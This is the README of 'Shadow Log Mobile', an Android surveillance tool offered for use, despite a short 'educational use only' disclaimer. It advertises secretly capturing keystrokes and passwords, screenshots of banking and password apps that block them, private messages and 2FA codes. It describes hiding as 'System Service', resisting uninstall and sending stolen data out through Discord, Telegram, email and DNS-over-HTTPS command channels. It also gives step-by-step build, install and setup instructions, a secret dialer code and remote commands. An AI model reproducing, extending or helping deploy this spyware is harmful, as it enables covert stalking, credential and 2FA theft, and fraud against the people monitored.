# Shadow Log Mobile — Android Edition v2.0

![Android](https://img.shields.io/badge/Platform-Android-3DDC84?style=for-the-badge&logo=android&logoColor=white)
![Kotlin](https://img.shields.io/badge/Language-Kotlin-7F52FF?style=for-the-badge&logo=kotlin&logoColor=white)
![API](https://img.shields.io/badge/API-26+-brightgreen?style=for-the-badge)
![Version](https://img.shields.io/badge/Version-2.0-blueviolet?style=for-the-badge)

The Android companion to Shadow Log — a native mobile monitoring framework with **FLAG_SECURE screenshot bypass**, comprehensive notification capture, and full remote command & control. All logs are AES-256-GCM encrypted and compatible with the desktop Decryptor.

---

> [!CAUTION]
> ### Legal and Ethical Warning
> **FOR AUTHORIZED EDUCATIONAL AND RESEARCH USE ONLY.**
> Unauthorized deployment on devices you do not own or have explicit documented permission to monitor is illegal.

---

## ⚡ Key Features

### 📸 Screenshot Bypass (FLAG_SECURE)
Uses `AccessibilityService.takeScreenshot()` (Android 11+) to capture screens **even in apps that block screenshots** — banking apps, password managers, Snapchat, etc. are all capturable.

- **Burst Mode**: 3-shot capture (0.7s, 3.2s, 5.7s) for login/payment screens
- **Single Mode**: One-shot for standard sensitive windows
- **Automatic Triggers**: Login, password, bank, payment, OTP, 2FA keywords
- **Sent to**: Discord (file upload) + Telegram (photo)

### 💬 Full Notification Capture
Deep-extracts messages from **all** messaging apps:
- WhatsApp (individual + group, with sender names)
- Telegram, Instagram DMs, Facebook Messenger
- SMS/MMS, Discord, Slack, Microsoft Teams
- Email (Gmail, Outlook, Yahoo)
- **2FA codes** from Google Authenticator, Authy, Microsoft Authenticator

### 🔑 Input Capture
- All text typed in any app (via Accessibility Service)
- **Password field detection** — flags `[PWD:xxx]` when typing in password inputs
- **Field type identification** — Email, Username, Phone, Card, CVV
- Hardware keyboard support (physical/Bluetooth)
- Button click tracking (Login, Submit, Pay, Confirm, etc.)
- **Deep screen scanning** — reads all visible text on app screens

### 🕵️ Stealth & Hiding
- **Auto-hide from launcher** after setup
- **Secret dialer code**: `*#*#27420#*#*` to re-open setup
- **Minimal notification** (PRIORITY_MIN, VISIBILITY_SECRET)
- Disguised as "System Service" in app list
- Random 30-90s startup delay
- 2-8s random jitter between network syncs
- **Anti-uninstall** via Device Admin
- **Survives** reboots, app updates, and swipe-to-close

### 🔓 Decryptor (Mobile)
Built-in forensic log viewer with:
- Color-coded entries by type (messages, passwords, clipboard, WiFi, etc.)
- Live search and filter
- JSON export
- Access: `adb shell am start -n com.system.service/.DecryptorActivity`

### 🧹 Uninstaller (Mobile)
Complete clean removal tool:
1. Stops all services
2. Deactivates Device Admin
3. Wipes all encrypted data
4. Clears all configuration
5. Re-shows app in launcher
6. Prompts system uninstall dialog
- Access: `adb shell am start -n com.system.service/.UninstallerActivity`

---

## Feature Parity with Desktop

| Feature | Desktop (Windows) | Mobile (Android) |
|---------|-------------------|-------------------|
| **Input Capture** | Global keyboard hook | Accessibility Service |
| **Password Detection** | N/A | ✅ `[PWD:xxx]` tagging |
| **Window Context** | GetForegroundWindow | Package + Activity title |
| **Screen Scan** | N/A | ✅ Accessibility tree traversal |
| **Clipboard** | Win32 OpenClipboard | ClipboardManager listener |
| **WiFi Logging** | netsh wlan | ConnectivityManager callback |
| **Screenshots** | kbinani/screenshot | ✅ **AccessibilityService (bypasses FLAG_SECURE!)** |
| **Notifications** | N/A | ✅ Full NotificationListenerService |
| **2FA Code Capture** | N/A | ✅ Authenticator app notifications |
| **Discord Exfil** | ✅ Webhook + file | ✅ OkHttp webhook + photo upload |
| **Telegram Exfil** | ✅ Bot API + photo | ✅ OkHttp Bot API + photo upload |
| **SMTP Exfil** | ✅ TLS/STARTTLS | ✅ Jakarta Mail |
| **DoH C2** | ✅ Cloudflare | ✅ OkHttp Cloudflare |
| **Kill Switch** | ✅ 5 commands | ✅ Same 5 commands |
| **Encryption** | AES-256-GCM | AES-256-GCM (compatible!) |
| **Persistence** | Registry + schtasks | Boot Receiver + ForegroundService |
| **Anti-Uninstall** | N/A | ✅ Device Admin |
| **Stealth** | Hidden window | ✅ Hidden launcher + secret code |
| **Decryptor** | ✅ Decryptor.exe | ✅ DecryptorActivity (WebView) |
| **Uninstaller** | ✅ Uninstaller.exe | ✅ UninstallerActivity |

---

## Project Structure

```
mobile/
├── build.bat                           # Build script
├── build.gradle.kts                    # Root build
├── settings.gradle.kts
├── gradlew.bat
├── app/
│   ├── build.gradle.kts
│   ├── proguard-rules.pro
│   └── src/main/
│       ├── AndroidManifest.xml
│       ├── java/com/system/service/
│       │   ├── ShadowApp.kt            # Application class
│       │   ├── SetupActivity.kt        # Setup wizard + tools access
│       │   ├── DecryptorActivity.kt     # 🔓 Forensic log viewer
│       │   ├── UninstallerActivity.kt   # 🧹 Clean removal tool
│       │   ├── core/
│       │   │   ├── Config.kt           # Encrypted SharedPreferences
│       │   │   ├── Encryption.kt       # AES-256-GCM (desktop-compatible)
│       │   │   ├── Stealth.kt          # Hide/show + permission checks
│       │   │   └── Storage.kt          # Encrypted log file storage
│       │   ├── services/
│       │   │   ├── MonitorService.kt           # Core foreground service
│       │   │   ├── InputAccessibilityService.kt # Input + SS bypass
│       │   │   └── NotifListenerService.kt      # Full message capture
│       │   ├── monitor/
│       │   │   ├── ClipboardMonitor.kt # Clipboard changes
│       │   │   ├── WiFiMonitor.kt      # Network tracking
│       │   │   └── ScreenCapture.kt    # 📸 FLAG_SECURE bypass
│       │   ├── exfil/
│       │   │   ├── DiscordExfil.kt     # Discord webhook + photos
│       │   │   ├── TelegramExfil.kt    # Telegram Bot API + photos
│       │   │   ├── SMTPExfil.kt        # Email (TLS/STARTTLS)
│       │   │   └── DoHExfil.kt         # DNS-over-HTTPS fallback
│       │   ├── remote/
│       │   │   └── KillSwitch.kt       # Telegram commands
│       │   └── receivers/
│       │       ├── BootReceiver.kt     # Auto-start on boot
│       │       ├── UpdateReceiver.kt   # Survive app updates
│       │       ├── DeviceAdminReceiver.kt  # Anti-uninstall
│       │       └── SecretCodeReceiver.kt   # *#*#27420#*#*
│       └── res/
│           ├── layout/activity_setup.xml
│           ├── drawable/card_bg.xml, logo_bg.xml
│           ├── mipmap-anydpi-v26/ic_launcher.xml
│           ├── values/colors.xml, strings.xml, themes.xml
│           └── xml/accessibility_config.xml, device_admin.xml
```

---

## Build & Deploy

### Prerequisites
- Android Studio Ladybug (2024.2+)
- JDK 17+
- Android SDK API 35
- Target Device: Android 8.0+ (API 26+), screenshots need Android 11+ (API 30+)

### Build
```powershell
cd mobile
.\build.bat
# or
.\gradlew.bat assembleDebug
```

### Install
```powershell
adb install -r app\build\outputs\apk\debug\app-debug.apk
```

### Setup
1. Launch **"System Service"** from app drawer
2. Enable **Accessibility Service** → REQUIRED (input capture + screenshots)
3. Enable **Notification Access** → REQUIRED (message capture)
4. Disable **Battery Optimization** → RECOMMENDED (persistence)
5. Configure exfiltration channels (Discord/Telegram/SMTP)
6. Set options (encryption, kill switch, hide app)
7. Tap **Initialize Service** → app hides, runs silently

### Re-access after hiding
```
Method 1: Dial *#*#27420#*#* on the phone dialer
Method 2: adb shell am start -n com.system.service/.SetupActivity
```

### Access Decryptor
```
adb shell am start -n com.system.service/.DecryptorActivity
```

### Access Uninstaller
```
adb shell am start -n com.system.service/.UninstallerActivity
```

---

## Remote Commands (Telegram)

| Command | Action |
|---------|--------|
| `/kill` | Self-destruct (wipe + uninstall prompt) |
| `/pause` | Suspend all monitoring |
| `/resume` | Resume monitoring |
| `/status` | Device model, OS, PID, log size |
| `/wipe` | Delete all local data |

---

## Encryption Compatibility

Logs use the **exact same format** as desktop:
- **Algorithm**: AES-256-GCM
- **Key**: SHA-256(password + salt)
- **Salt**: `wus_cache_v2_9283` (identical)
- **Format**: `nonce || ciphertext` → Base64

✅ Mobile logs can be decrypted by the desktop **Decryptor.exe** with the same password.

---
